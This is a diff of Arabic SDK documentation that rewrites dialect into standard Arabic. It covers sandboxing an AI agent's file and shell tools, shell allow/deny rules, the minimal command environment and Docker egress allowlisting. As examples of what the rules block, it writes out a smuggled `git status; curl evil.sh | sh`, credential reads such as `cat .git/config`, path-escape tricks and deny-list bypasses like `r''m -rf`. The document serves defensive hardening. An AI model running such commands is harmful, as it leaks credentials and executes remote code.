 const tools = createFsTools(workspace, { readOnly: true, deny: ['.git', '.env', '.env.*'] });
 ```
 
-الروابط إلى `.git` تُرفض كمان. مع `NodeWorkspace` (أو أي provider ينفّذ `realPath`)، الفحص يشتغل أيضًا على المكان اللي يوصل له المسار فعلًا، فالـsymlink أو الـjunction في Windows في أي مكان آخر بالـworkspace اللي يشير إلى `.git` أو لداخله (`gitj -> .git` و`hooks -> .git/hooks` و`cfg -> .git/config`) ما يمكن استخدامه لقراءة أو كتابة أو تعديل اللي وراه: `read_file gitj/config` و`edit_file gitj/config` و`write_file gitj/PWNED` أخطاء أداة، ومثلها `list_dir` و`glob` و`grep` لما يُعطى الرابط كـ`path` لها (`grep` مع `path: 'gitj'` أو `path: 'gitj/config'`). `glob` و`grep` لا تتبعان الروابط أبدًا أثناء المرور على الشجرة، فالبحث من الـroot ما يوصل لـ`.git` عبر رابط هو الآخر. الـprovider اللي ما عنده `realPath` (`MemoryWorkspace` ما فيه روابط) ياخذ فحص الاسم فقط.
+تُرفض الروابط إلى `.git` أيضًا. مع `NodeWorkspace` (أو أي provider ينفّذ `realPath`)، يعمل الفحص أيضًا على المكان الذي يصل إليه المسار فعلًا، فلا يمكن استخدام الـsymlink أو الـjunction في Windows في أي مكان آخر من الـworkspace الذي يشير إلى `.git` أو إلى داخله (`gitj -> .git` و`hooks -> .git/hooks` و`cfg -> .git/config`) لقراءة ما وراءه أو كتابته أو تعديله: `read_file gitj/config` و`edit_file gitj/config` و`write_file gitj/PWNED` أخطاء أداة، ومثلها `list_dir` و`glob` و`grep` عندما يُعطى الرابط كـ`path` لها (`grep` مع `path: 'gitj'` أو `path: 'gitj/config'`). ولا تتبع `glob` و`grep` الروابط أبدًا أثناء المرور على الشجرة، فلا يصل البحث من الـroot إلى `.git` عبر رابط هو الآخر. والـprovider الذي ليس لديه `realPath` (`MemoryWorkspace` لا يحتوي على روابط) يحصل على فحص الاسم فقط.
 
-**أداة `shell` غير مشمولة:** الأمر نص حر، فما يمكن فلترته حسب المسار، و`cat .git/config` أو `git config --get-regexp extraheader` ما زالت تشتغل. أوامر git اللي تحتاجها الـcoding agents (`git status` و`git diff`) تمر عبر أداة الـshell، فخلّ قائمة `allow` فيها محصورة في أوامر git اللي تقصدها. وفي CI، مرّر كمان `persist-credentials: false` إلى `actions/checkout` إذا الـjob ما يعمل push.
+**أداة `shell` غير مشمولة:** الأمر نص حر، فلا يمكن تصفيته حسب المسار، ولا تزال `cat .git/config` أو `git config --get-regexp extraheader` تعمل. وأوامر git التي تحتاجها الـcoding agents (`git status` و`git diff`) تمر عبر أداة الـshell، فأبقِ قائمة `allow` فيها محصورة في أوامر git التي تقصدها. وفي CI، مرّر أيضًا `persist-credentials: false` إلى `actions/checkout` إذا كان الـjob لا يعمل push.
 
-**الرفض يظهر كخطأ أداة.** مسار مرفوض، أو ملف غير موجود، أو تعديل مبهم يرمي `WorkspaceError` داخل الأداة. يستلم الـmodel `{ "error": "WorkspaceError", "toolName": "read_file", "message": "..." }` ويكمل الـrun. الرسائل تعرض مسار الـworkspace، ولا تعرض أبدًا مسار الـhost.
+**يظهر الرفض كخطأ أداة.** المسار المرفوض، أو الملف غير الموجود، أو التعديل المبهم يرمي `WorkspaceError` داخل الأداة. يستلم الـmodel `{ "error": "WorkspaceError", "toolName": "read_file", "message": "..." }` ويكمل الـrun. وتعرض الرسائل مسار الـworkspace، ولا تعرض أبدًا مسار الـhost.
 
-**الأوامر تشتغل ببيئة دنيا.** `NodeWorkspace` ينفّذ الأوامر مع `cwd` مضبوط على الـroot، ولا يورّثها بيئة العملية الأم. اللي يُنسخ فقط: `PATH` و`HOME` و`USERPROFILE` و`TEMP` و`TMP` و`TMPDIR` و`LANG` و`LC_*` و`TERM`، زائد `SystemRoot` و`SystemDrive` و`ComSpec` و`PATHEXT` و`WINDIR` في Windows، لأن الـshell يحتاجها حتى يشتغل. بالتالي `OPENAI_API_KEY` و`ANTHROPIC_API_KEY` وبيانات اعتماد السحابة وغيرها من الأسرار في بيئة السيرفر عندك غير مرئية للأوامر اللي يكتبها الـmodel، ولا يقدر `env` أو `printenv` يكشفها. إذا تبي تعطي الأوامر أكثر، إما مرّر قيمًا (`env: { GITHUB_TOKEN: scopedToken }`) أو سمِّ متغيرات من الـhost تُنسخ (`inheritEnv: ['CI']`). أي شيء تمرّره بهذه الطريقة مرئي للـmodel. `inheritEnv: true` يمرّر بيئة الـhost كاملة، زي ما كان الوضع قبل وجود هذا السلوك الافتراضي؛ استخدمه فقط مع أوامر تثق فيها. وفي Windows يضيف مشغّل العمليات في Node كمان متغيرات الـsession اللي كل عملية تحتاجها (`HOMEDRIVE` و`HOMEPATH` و`USERNAME` و`USERDOMAIN` و`LOGONSERVER`)؛ ولا واحد منها سرّي.
+**تعمل الأوامر ببيئة دنيا.** ينفّذ `NodeWorkspace` الأوامر مع `cwd` مضبوط على الـroot، ولا يورّثها بيئة العملية الأم. لا يُنسخ إلا: `PATH` و`HOME` و`USERPROFILE` و`TEMP` و`TMP` و`TMPDIR` و`LANG` و`LC_*` و`TERM`، إضافةً إلى `SystemRoot` و`SystemDrive` و`ComSpec` و`PATHEXT` و`WINDIR` في Windows، لأن الـshell يحتاجها لكي يعمل. وبالتالي فإن `OPENAI_API_KEY` و`ANTHROPIC_API_KEY` وبيانات اعتماد السحابة وغيرها من الأسرار في بيئة السيرفر لديك غير مرئية للأوامر التي يكتبها الـmodel، ولا يستطيع `env` أو `printenv` كشفها. إذا أردت إعطاء الأوامر أكثر، فإما أن تمرّر قيمًا (`env: { GITHUB_TOKEN: scopedToken }`) أو تسمّي متغيرات من الـhost تُنسخ (`inheritEnv: ['CI']`). وأي شيء تمرّره بهذه الطريقة مرئي للـmodel. يمرّر `inheritEnv: true` بيئة الـhost كاملة، كما كان الوضع قبل وجود هذا السلوك الافتراضي؛ فلا تستخدمه إلا مع أوامر تثق بها. وفي Windows يضيف مشغّل العمليات في Node أيضًا متغيرات الـsession التي تحتاجها كل عملية (`HOMEDRIVE` و`HOMEPATH` و`USERNAME` و`USERDOMAIN` و`LOGONSERVER`)؛ ولا شيء منها سرّي.
 
 ```ts
 import { NodeWorkspace } from 'lousho';
@@ -210,13 +210,13 @@ const workspace = new NodeWorkspace({
 });
 ```
 
-`root` لازم يكون موجود أصلًا: الـconstructor يحلّه بـ`realpath` ويرمي `ConfigurationError` إذا كان المسار مفقودًا أو فاضيًا أو مو مجلد — ما ينشئه أبدًا. القيمة المحفوظة في `workspace.root` هي المسار الحقيقي المطلق.
+يجب أن يكون `root` موجودًا مسبقًا: يحلّه الـconstructor بـ`realpath` ويرمي `ConfigurationError` إذا كان المسار مفقودًا أو فارغًا أو ليس مجلدًا — ولا ينشئه أبدًا. والقيمة المحفوظة في `workspace.root` هي المسار الحقيقي المطلق.
 
-**أداة الـshell تحتاج approval افتراضيًا.** إلا إذا اخترت غير كذا، كل أمر يستنى بشر. `allow` و`deny` تُفحص أولًا، فالأمر المرفوض ما يُعرض أصلًا للـapproval:
+**تحتاج أداة الـshell إلى approval افتراضيًا.** ما لم تختر غير ذلك، ينتظر كل أمر إنسانًا. تُفحص `allow` و`deny` أولًا، فلا يُعرض الأمر المرفوض للـapproval أصلًا:
 
-- النمط النصي يطابق أمرًا يساويه تمامًا، أو يبدأ فيه متبوعًا بمسافة (`'git status'` يطابق `git status -s`).
-  النمط النصي يسمح بالأمر مع معاملات عادية، لكن مو مع مسار يطلع من مجلد العمل: مقطع `..` أو `~` أو مسار مطلق، في أي مكان بالأمر بما فيه `--flag=value`. وهذا يسري لما يكون المسار بين علامات تنصيص (`cat "../x"` و`cat '..'/x` و`type "c:\windows\win.ini"`)، أو مهرَّب تحت sh (`cat .\./x`)، أو glob ممكن يتوسع إلى `..` (`cat .?/x`). والأمر اللي فيه `$` أو `{` أو `}` يُرفض كمان، لأن الـshell يوسّعه لنص ما يقدر الفحص يشوفه (`cat $HOME/.gitconfig` و`cat ${IFS}../x` و`cat {..,x}/secret.txt`). لذلك `allow: ['node --test']` ما يسمح بـ`node --test --test-reporter-destination=../x`. إذا تبي تسمح بمعاملات مثل هذي، استخدم `CommandRule` أو RegExp مثبّت. ومع ذلك النمط النصي ليس حدًّا أمنيًا كاملًا لما يسويه البرنامج بمعاملاته (ملف إعدادات يقراه، سكربت يشغّله)، ففضّل `CommandRule` يثبّتها.
-- كائن `CommandRule` يثبّت المعاملات. `{ command: 'npm test' }` يطابق `npm test` ولا شيء غيره. و`{ command: 'node --test', args }` يطابق لما يبدأ الأمر بـ`node --test` وترجع `args(rest)` القيمة `true` لباقي السطر (`''` إذا ما فيه باقي):
+- يطابق النمط النصي أمرًا يساويه تمامًا، أو يبدأ به متبوعًا بمسافة (`'git status'` يطابق `git status -s`).
+  يسمح النمط النصي بالأمر مع معاملات عادية، لكن ليس مع مسار يخرج من مجلد العمل: مقطع `..` أو `~` أو مسار مطلق، في أي مكان من الأمر بما في ذلك `--flag=value`. ويسري هذا عندما يكون المسار بين علامات تنصيص (`cat "../x"` و`cat '..'/x` و`type "c:\windows\win.ini"`)، أو مهرَّبًا تحت sh (`cat .\./x`)، أو glob قد يتوسع إلى `..` (`cat .?/x`). ويُرفض أيضًا الأمر الذي يحتوي على `$` أو `{` أو `}`، لأن الـshell يوسّعه إلى نص لا يستطيع الفحص رؤيته (`cat $HOME/.gitconfig` و`cat ${IFS}../x` و`cat {..,x}/secret.txt`). لذلك لا يسمح `allow: ['node --test']` بـ`node --test --test-reporter-destination=../x`. إذا أردت السماح بمعاملات مثل هذه، فاستخدم `CommandRule` أو RegExp مثبّتًا. ومع ذلك فإن النمط النصي ليس حدًّا أمنيًا كاملًا لما يفعله البرنامج بمعاملاته (ملف إعدادات يقرؤه، أو سكربت يشغّله)، ففضّل `CommandRule` يثبّتها.
+- يثبّت كائن `CommandRule` المعاملات. يطابق `{ command: 'npm test' }` الأمر `npm test` ولا شيء غيره. ويطابق `{ command: 'node --test', args }` عندما يبدأ الأمر بـ`node --test` وتُرجع `args(rest)` القيمة `true` لبقية السطر (`''` إذا لم توجد بقية):
 
   ```ts
   import { createShellTool, NodeWorkspace } from 'lousho';
@@ -230,22 +230,22 @@ const workspace = new NodeWorkspace({
     ],
   });
   ```
-- في `allow`، الأمر اللي طابقه نمط نصي أو `CommandRule` فقط لازم ما يحتوي معاملات shell (`;` `&` `|` `` ` `` `$(` `<` `>` أو سطر جديد). وتحت cmd.exe، `%` (توسيع المتغيرات) و`^` (التهريب) تُحسب معاملات كمان. هذا يمنع `git status; curl evil.sh | sh` من المرور كـ`git status`.
-- الـRegExp يُختبر على سطر الأمر كامل، فثبّته من الطرفين: `/^npm (test|run lint)$/`.
-- أنماط `deny` النصية و`CommandRule`s تُفحص على كل جزء من الأمر مفصول بـ`;` أو `&` أو `|`.
+- في `allow`، يجب ألّا يحتوي الأمر الذي طابقه نمط نصي أو `CommandRule` فقط على معاملات shell (`;` `&` `|` `` ` `` `$(` `<` `>` أو سطر جديد). وتحت cmd.exe، تُحسب `%` (توسيع المتغيرات) و`^` (التهريب) معاملات أيضًا. وهذا يمنع `git status; curl evil.sh | sh` من المرور كـ`git status`.
+- يُختبر الـRegExp على سطر الأمر كاملًا، فثبّته من الطرفين: `/^npm (test|run lint)$/`.
+- تُفحص أنماط `deny` النصية و`CommandRule`s على كل جزء من الأمر مفصول بـ`;` أو `&` أو `|`.
 
-وصف الأداة يخبر الـmodel أي shell ينفّذ أوامره، إذا الـprovider صرّح بذلك (`NodeWorkspace` و`SandboxShell` يكشفان خاصية `shell`). في Windows يستخدم `NodeWorkspace` الـcmd.exe، فيُقال للـmodel يستخدم علامات التنصيص المزدوجة ويكتب المتغيرات بصيغة `%NAME%`. والـprovider اللي ما يسمّي الـshell حقه يُعامَل كـcmd.exe في فحص المعاملات على Windows.
+يخبر وصف الأداة الـmodel أي shell ينفّذ أوامره، إذا صرّح الـprovider بذلك (يكشف `NodeWorkspace` و`SandboxShell` الخاصية `shell`). وفي Windows يستخدم `NodeWorkspace` الـcmd.exe، فيُطلب من الـmodel استخدام علامات التنصيص المزدوجة وكتابة المتغيرات بصيغة `%NAME%`. والـprovider الذي لا يسمّي الـshell الخاص به يُعامَل كـcmd.exe في فحص المعاملات على Windows.
 
 ### ما لا يُفرَض
 
-- **الـshell في `NodeWorkspace` ليس sandbox.** حصر المسارات يسري على أدوات الملفات فقط. الأمر يشتغل بمستخدم نظام التشغيل عندك، ويقدر يقرأ ويكتب ويحذف أي شيء يقدر عليه ذلك المستخدم، بما فيه `../` و`~/.ssh`، ويقدر يستخدم الشبكة. الـapproval وقوائم `allow` تقلّل الخطر، لكنها ليست عزلًا. مع مدخلات غير موثوقة، مثل prompts جاية من الجمهور أو محتوى منزّل من الويب، أعطِ أداة الـshell `ShellProvider` مبني على sandbox (انظر أدناه)، واستخدم أدوات الملفات مع `readOnly: true` أو مع approval.
-- **قائمة `deny` للتسهيل فقط.** في الـshell طرق كثيرة لكتابة نفس الأمر (`r''m -rf`، `$(echo rm)`، مسافة زايدة، ملف سكربت)، فلا تعتمد على `deny` للأمان. استخدم `allow` لذلك.
-- **السباقات والـhard links.** المسارات تُفحص ثم تُستخدم. عملية تبدّل مجلدًا بـsymlink بين الخطوتين تقدر تلفّ على الفحص. عملية كهذه عندها وصول محلي أصلًا، مثل أمر شغّلته أداة الـshell بدون sandbox. ولا يمكن اكتشاف hard link داخل الـroot يشير لملف خارجه.
-- **`grep` يشغّل regex الـmodel، فهو محاط بقيود.** النمط اللي يكرر مجموعة هي أصلًا متكررة (`(a+)+` و`(\w+\s*)*`) يُرفض كخطأ أداة، لأنه ممكن ياخذ وقتًا أُسّيًا. كل سطر يُختبر على أول 2,000 حرف منه. المطابقة تشتغل في worker thread بميزانية 10 ثوانٍ لكل استدعاء: النمط البطيء يُوقف بخطأ أداة، والـabort يوقفه فورًا، والـevent loop يبقى حر خلال ذلك. وإذا `node:worker_threads` غير متاح، تشتغل المطابقة inline.
+- **الـshell في `NodeWorkspace` ليس sandbox.** يسري حصر المسارات على أدوات الملفات فقط. يعمل الأمر بمستخدم نظام التشغيل لديك، ويستطيع قراءة وكتابة وحذف أي شيء يستطيعه ذلك المستخدم، بما في ذلك `../` و`~/.ssh`، ويستطيع استخدام الشبكة. يقلّل الـapproval وقوائم `allow` الخطر، لكنها ليست عزلًا. ومع مدخلات غير موثوقة، مثل prompts قادمة من الجمهور أو محتوى منزّل من الويب، أعطِ أداة الـshell `ShellProvider` مبنيًا على sandbox (انظر أدناه)، واستخدم أدوات الملفات مع `readOnly: true` أو مع approval.
+- **قائمة `deny` للتسهيل فقط.** في الـshell طرق كثيرة لكتابة الأمر نفسه (`r''m -rf`، `$(echo rm)`، مسافة زائدة، ملف سكربت)، فلا تعتمد على `deny` للأمان. استخدم `allow` لذلك.
+- **السباقات والـhard links.** تُفحص المسارات ثم تُستخدم. وتستطيع عملية تبدّل مجلدًا بـsymlink بين الخطوتين الالتفاف على الفحص. وعملية كهذه لديها وصول محلي أصلًا، مثل أمر شغّلته أداة الـshell بدون sandbox. ولا يمكن اكتشاف hard link داخل الـroot يشير إلى ملف خارجه.
+- **يشغّل `grep` الـregex الخاص بالـmodel، لذا فهو محاط بقيود.** النمط الذي يكرر مجموعة متكررة أصلًا (`(a+)+` و`(\w+\s*)*`) يُرفض كخطأ أداة، لأنه قد يستغرق وقتًا أُسّيًا. يُختبر كل سطر على أول 2,000 حرف منه. وتعمل المطابقة في worker thread بميزانية 10 ثوانٍ لكل استدعاء: يُوقف النمط البطيء بخطأ أداة، ويوقفه الـabort فورًا، ويبقى الـevent loop حرًا خلال ذلك. وإذا لم يكن `node:worker_threads` متاحًا، تعمل المطابقة inline.
 
 ### Sandboxed shell: `SandboxShell`
 
-`SandboxShell` يحوّل أي `SandboxAdapter`، مثل `SubprocessSandbox` المبني على Docker، إلى `ShellProvider`. كل أمر ينفَّذ كـ`sh -c "<command>"` في container جديد بلا شبكة. الـcontainer يشوف `cwd` فقط، وهو مربوط bind-mount على نفس المسار. وما ياخذ إلا الـ`env` اللي تمرّره، ولا شيء من الـhost. أدوات الملفات تقدر تكمل تستخدم `NodeWorkspace` على نفس المجلد:
+يحوّل `SandboxShell` أي `SandboxAdapter`، مثل `SubprocessSandbox` المبني على Docker، إلى `ShellProvider`. يُنفَّذ كل أمر كـ`sh -c "<command>"` في container جديد بلا شبكة. لا يرى الـcontainer إلا `cwd`، وهو مربوط bind-mount على المسار نفسه. ولا يحصل إلا على الـ`env` الذي تمرّره، ولا شيء من الـhost. وتستطيع أدوات الملفات الاستمرار في استخدام `NodeWorkspace` على المجلد نفسه:
 
 ```ts
 import { createFsTools, createShellTool, NodeWorkspace, SandboxShell, SubprocessSandbox } from 'lousho';
@@ -255,27 +255,27 @@ const shell = new SandboxShell(new SubprocessSandbox({ image: 'node:20-alpine' }
 const tools = [...createFsTools(workspace), createShellTool(shell, { needsApproval: false })];
 ```
 
-**البيئة والشبكة.** `SandboxShell` يأخذ نفس خياري `env` و`inheritEnv` الخاصين بـ`NodeWorkspace`. الـcontainer ياخذ هذه المتغيرات فقط: لا بيئة الـhost أبدًا، ولا `PATH` ولا `HOME` الخاصين بالـhost، لأن الـimage تجيب قيمها بنفسها. مع `NoopSandbox` (اللي يشتغل على الـhost) ياخذ الأمر نفس القاعدة الصغيرة اللي يستخدمها `NodeWorkspace`، زائد متغيراتك؛ و`inheritEnv: true` يرجّع بيئة الـhost كاملة هناك، لكن الـcontainer ما يستلمها أبدًا ولا بذلك.
+**البيئة والشبكة.** يأخذ `SandboxShell` خياري `env` و`inheritEnv` نفسيهما الخاصين بـ`NodeWorkspace`. ولا يحصل الـcontainer إلا على هذه المتغيرات: لا بيئة الـhost أبدًا، ولا `PATH` ولا `HOME` الخاصين بالـhost، لأن الـimage توفّر قيمها بنفسها. ومع `NoopSandbox` (الذي يعمل على الـhost) يحصل الأمر على القاعدة الصغيرة نفسها التي يستخدمها `NodeWorkspace`، إضافةً إلى متغيراتك؛ ويعيد `inheritEnv: true` بيئة الـhost كاملة هناك، لكن الـcontainer لا يستلمها أبدًا حتى مع ذلك.
 
-`SubprocessSandbox` يأخذ سياسة `network`:
+يأخذ `SubprocessSandbox` سياسة `network`:
 
-| `network` | اللي يحصل عليه الـcontainer |
+| `network` | ما يحصل عليه الـcontainer |
 |---|---|
 | `'none'` (الافتراضي) | لا شبكة إطلاقًا (`NetworkMode: 'none'` في Docker). |
 | `'default'` | شبكة Docker الافتراضية: egress غير مقيد. |
 | `{ allow: ['api.github.com', '*.npmjs.org'] }` مع `broker` | هذه الـhosts فقط، عبر الـ[credential broker](#credential-broker). التفاصيل أدناه. |
 | `{ allow: [...] }` بدون `broker` | لا شبكة (fail-closed). |
 
-أسماء الـhosts تُفحص لما يُنشأ الـsandbox، فعنوان URL أو اسم غير سليم يرمي خطأ؛ والقائمة بعد التحقق تُحفظ في `sandbox.network`.
+تُفحص أسماء الـhosts عند إنشاء الـsandbox، فيرمي عنوان URL أو اسم غير سليم خطأً؛ وتُحفظ القائمة بعد التحقق في `sandbox.network`.
 
 #### Allowlisted egress: `network: { allow }` with a broker
 
-Docker ما يقدر لوحده يفلتر الـegress حسب اسم الـhost، فقائمة `allow` ما تُفرَض إلا لما يكون الـproxy هو الطريق الوحيد للخروج من الـcontainer. `SubprocessSandbox` يبني هذا بعناصر Docker نفسها:
+لا يستطيع Docker وحده تصفية الـegress حسب اسم الـhost، فلا تُفرَض قائمة `allow` إلا عندما يكون الـproxy هو الطريق الوحيد للخروج من الـcontainer. يبني `SubprocessSandbox` هذا بعناصر Docker نفسها:
 
-1. عند أول `run()` ينشئ شبكة bridge **داخلية** (`Internal: true`، بلا IPv6، وبـlabel `com.lousho.sandbox=egress`) اسمها `networkName` أو `lousho-egress-<random>`. الشبكة الداخلية ما فيها طريق خارج الـbridge. إذا كانت موجودة شبكة بهذا الاسم، تُستعمل من جديد، لكن فقط إذا كانت داخلية.
-2. الـbroker ياخذ listener ثاني على عنوان الـgateway لتلك الشبكة، وهو في Docker Engine على Linux واجهة الـhost نفسها على الـbridge. يقبل اتصالات من subnet تلك الشبكة فقط (أي طرف ثاني يُقطع قبل قراءة بايت واحد)، فهو ليس proxy مفتوح على باقي واجهات الـhost. قائمته هي hosts قواعد الـbroker زائد قائمة `allow` الخاصة بالـsandbox. خيار `allow` الخاص بالـbroker وlistener الـloopback ما يتغيرون.
-3. كل container ينضم لتلك الشبكة مع `HTTP_PROXY`/`HTTPS_PROXY` (وصيغها الصغيرة) مضبوطة على listener الـgateway، مدمجة فوق `env` اللي تمرّره. `NO_PROXY` فيه عنوان الـgateway فقط، فيوصل `$HTTP_PROXY/__broker/<host>/<path>` (صيغة المسار اللي تضيف credentials) للـbroker مباشرة؛ وما يعطي أي bypass ثاني، لأنه ما فيه شيء ثاني قابل للوصول أصلًا.
-4. `sandbox.close()` يوقف الـlistener ويحذف الشبكة إذا كان هذا الـsandbox هو اللي أنشأها. الـrun الملغي أو منتهي الـtimeout يحذف الـcontainer مثل قبل؛ والشبكة تبقى للـrun التالي للـsandbox حتى تنادي `close()`.
+1. عند أول `run()` ينشئ شبكة bridge **داخلية** (`Internal: true`، بلا IPv6، وبالـlabel `com.lousho.sandbox=egress`) اسمها `networkName` أو `lousho-egress-<random>`. لا يوجد في الشبكة الداخلية طريق خارج الـbridge. وإذا كانت هناك شبكة موجودة بهذا الاسم، يُعاد استخدامها، لكن فقط إذا كانت داخلية.
+2. يحصل الـbroker على listener ثانٍ على عنوان الـgateway لتلك الشبكة، وهو في Docker Engine على Linux واجهة الـhost نفسها على الـbridge. ويقبل اتصالات من subnet تلك الشبكة فقط (يُقطع أي طرف آخر قبل قراءة بايت واحد)، فهو ليس proxy مفتوحًا على بقية واجهات الـhost. وقائمته هي hosts قواعد الـbroker إضافةً إلى قائمة `allow` الخاصة بالـsandbox. ولا يتغير خيار `allow` الخاص بالـbroker ولا listener الـloopback.
+3. ينضم كل container إلى تلك الشبكة مع `HTTP_PROXY`/`HTTPS_PROXY` (وصيغها الصغيرة) مضبوطة على listener الـgateway، مدمجة فوق `env` الذي تمرّره. ولا يحتوي `NO_PROXY` إلا على عنوان الـgateway، فيصل `$HTTP_PROXY/__broker/<host>/<path>` (صيغة المسار التي تضيف credentials) إلى الـbroker مباشرة؛ ولا يمنح أي bypass آخر، لأنه لا يوجد شيء آخر يمكن الوصول إليه أصلًا.
+4. يوقف `sandbox.close()` الـlistener ويحذف الشبكة إذا كان هذا الـsandbox هو الذي أنشأها. ويحذف الـrun الملغي أو المنتهي بـtimeout الـcontainer كما كان سابقًا؛ وتبقى الشبكة للـrun التالي للـsandbox حتى تستدعي `close()`.
 
 ```ts
 import { createCredentialBroker, createShellTool, SandboxShell, SubprocessSandbox } from 'lousho';
@@ -289,14 +289,14 @@ await sandbox.close();
 await broker.close();
 ```
 
-اللي يفرضه هذا، وأين:
+ما يفرضه هذا، وأين:
 
-- **Docker Engine على Linux والـagent على نفس الـhost: مفروض.** الـcontainer يقدر يوصل لعنوان الـgateway ولا شيء بعد الـbridge. في DNS: الـcontainer ما يحلّ أي أسماء خارجية بنفسه (Engine 25.0.5 وأحدث ما يمرّرون DNS من الشبكات الداخلية، CVE-2024-29018؛ والإصدارات الأقدم تُرفض)، فالأسماء تروح للـproxy اللي يحلّها على الـhost بعد فحص الـallowlist. الاتصالات المباشرة بـIP خام ما لها route. البروتوكولات غير HTTP (SSH وTCP خام وUDP) محجوبة، لأن الـproxy وحده اللي يمكن الوصول له، وأنفاق `CONNECT` تُفحص على الـallowlist مثل أي طلب. وهذا مُختبَر على daemon حقيقي: الـjob `compat` في الـCI (`npm run test:docker`) يشتغل على runner `ubuntu-latest` في GitHub (كان Docker Engine بصلاحيات root بالإصدار 28.0.4 على Ubuntu 24.04 لما أُضيف)، ويتأكد من أن الـhost المسموح يجاوب عبر الـbroker، وأن باقي الـhosts تاخذ 403، وأن تجاوز الـproxy أو الاتصال بـIP خام ما له route، وأن الـcontainer ما يحلّ أسماء خارجية، وأن الـbroker يضيف credentials ما يشوفها الـcontainer أبدًا، وأن container خارج الشبكة ما يقدر يستخدم listener الـgateway، وأن `close()` والـrun الملغي ما يتركان شبكة ولا container وراهم، وأن الشبكة المعاد استخدامها غير الداخلية تُرفض.
-- **Docker Desktop (Windows وmacOS، وDesktop على Linux): مرفوض.** الـcontainers تشتغل داخل VM، فالـhost ما له عنوان على الشبكة الداخلية. و`host.docker.internal` يوصل للـhost فقط من الشبكات غير الداخلية، وهذي توصل لكل شيء ثاني كمان. `run()` يرفض بـ[`LOUSHO_SANDBOX_EGRESS_UNSUPPORTED`](/ar/errors#lousho_sandbox_egress_unsupported) وما يشغّل أي container. ونفس الشيء مع Docker rootless (الـbridge عايش في network namespace خاص فيه)، ومع daemon على جهاز ثاني (الـbroker ما يقدر يربط عنوان الـgateway)، ومع شبكة معاد استخدامها ليست داخلية، ومع Engine أقدم من 25.0.5.
-- **خدمات ثانية على عنوان الـbridge في الـhost.** container على شبكة داخلية يقدر يوصل لأي خدمة على الـhost تستمع على عنوان الـgateway أو على كل العناوين (`0.0.0.0`). اربط خدمات الـhost بـ`127.0.0.1`، أو حط جدار ناري يقيّد subnet الـbridge لمنفذ الـbroker فقط. جدار ناري على الـhost يسقط الترافيك الجاي من الـbridge (سياسة `INPUT` صارمة) يحجب الـbroker كمان: وقتها الـruns تفشل في الاتصال، ولا تاخذ egress مفتوح.
-- **أوامر الـhost ما زالت بدون جدار ناري.** أمر ينفّذه `NodeWorkspace` أو `NoopSandbox` يقدر يتجاهل متغيرات الـproxy؛ راجع ملاحظات الـcredential broker أدناه.
+- **Docker Engine على Linux والـagent على الـhost نفسه: مفروض.** يستطيع الـcontainer الوصول إلى عنوان الـgateway ولا شيء بعد الـbridge. وفي DNS: لا يحلّ الـcontainer أي أسماء خارجية بنفسه (الإصدار 25.0.5 من Engine وما بعده لا يمرّر DNS من الشبكات الداخلية، CVE-2024-29018؛ والإصدارات الأقدم تُرفض)، فتذهب الأسماء إلى الـproxy الذي يحلّها على الـhost بعد فحص الـallowlist. ولا يوجد route للاتصالات المباشرة بـIP خام. والبروتوكولات غير HTTP (SSH وTCP خام وUDP) محجوبة، لأن الـproxy وحده هو ما يمكن الوصول إليه، وتُفحص أنفاق `CONNECT` على الـallowlist مثل أي طلب. وهذا مُختبَر على daemon حقيقي: يعمل الـjob `compat` في الـCI (`npm run test:docker`) على runner `ubuntu-latest` في GitHub (كان Docker Engine بصلاحيات root بالإصدار 28.0.4 على Ubuntu 24.04 عند إضافته)، ويتأكد من أن الـhost المسموح يجيب عبر الـbroker، وأن بقية الـhosts تحصل على 403، وأن تجاوز الـproxy أو الاتصال بـIP خام ليس له route، وأن الـcontainer لا يحلّ أسماء خارجية، وأن الـbroker يضيف credentials لا يراها الـcontainer أبدًا، وأن container خارج الشبكة لا يستطيع استخدام listener الـgateway، وأن `close()` والـrun الملغي لا يتركان شبكة ولا container خلفهما، وأن الشبكة المعاد استخدامها غير الداخلية تُرفض.
+- **Docker Desktop (Windows وmacOS، وDesktop على Linux): مرفوض.** تعمل الـcontainers داخل VM، فليس للـhost عنوان على الشبكة الداخلية. ولا يصل `host.docker.internal` إلى الـhost إلا من الشبكات غير الداخلية، وهذه تصل إلى كل شيء آخر أيضًا. يرفض `run()` بـ[`LOUSHO_SANDBOX_EGRESS_UNSUPPORTED`](/ar/errors#lousho_sandbox_egress_unsupported) ولا يشغّل أي container. والأمر نفسه مع Docker rootless (يعيش الـbridge في network namespace خاص به)، ومع daemon على جهاز آخر (لا يستطيع الـbroker الارتباط بعنوان الـgateway)، ومع شبكة معاد استخدامها ليست داخلية، ومع Engine أقدم من 25.0.5.
+- **خدمات أخرى على عنوان الـbridge في الـhost.** يستطيع container على شبكة داخلية الوصول إلى أي خدمة على الـhost تستمع على عنوان الـgateway أو على كل العناوين (`0.0.0.0`). اربط خدمات الـhost بـ`127.0.0.1`، أو ضع جدارًا ناريًا يقيّد subnet الـbridge بمنفذ الـbroker فقط. والجدار الناري على الـhost الذي يُسقط الترافيك القادم من الـbridge (سياسة `INPUT` صارمة) يحجب الـbroker أيضًا: حينها تفشل الـruns في الاتصال، ولا تحصل على egress مفتوح.
+- **لا تزال أوامر الـhost بدون جدار ناري.** يستطيع الأمر الذي ينفّذه `NodeWorkspace` أو `NoopSandbox` تجاهل متغيرات الـproxy؛ راجع ملاحظات الـcredential broker أدناه.
 
-هذه الضمانات مبنية على السلوك الموثّق للشبكات الداخلية في Docker؛ واختبارات الـSDK تفحص الربط على client مزيّف لـDocker، مو على daemon حي.
+هذه الضمانات مبنية على السلوك الموثّق للشبكات الداخلية في Docker؛ وتفحص اختبارات الـSDK الربط على client مزيّف لـDocker، لا على daemon حي.
 
 ```ts
 import { createShellTool, SandboxShell, SubprocessSandbox } from 'lousho';
@@ -310,13 +310,13 @@ const shell = new SandboxShell(sandbox, {
 const tool = createShellTool(shell, { needsApproval: false });
 ```
 
-اللي ما يغطيه هذا: أي قيمة تمرّرها في `env` أو `inheritEnv` تقدر أوامر الـmodel تقراها، و`network: 'default'` يخلي الأمر يرسلها لأي مكان. خلّي الأسرار طويلة الأمد برّا الاثنين؛ استخدم الـcredential broker أدناه بدلًا منها.
+ما لا يغطيه هذا: أي قيمة تمرّرها في `env` أو `inheritEnv` تستطيع أوامر الـmodel قراءتها، و`network: 'default'` يسمح للأمر بإرسالها إلى أي مكان. أبقِ الأسرار طويلة الأمد خارج الاثنين؛ واستخدم الـcredential broker أدناه بدلًا منها.
 
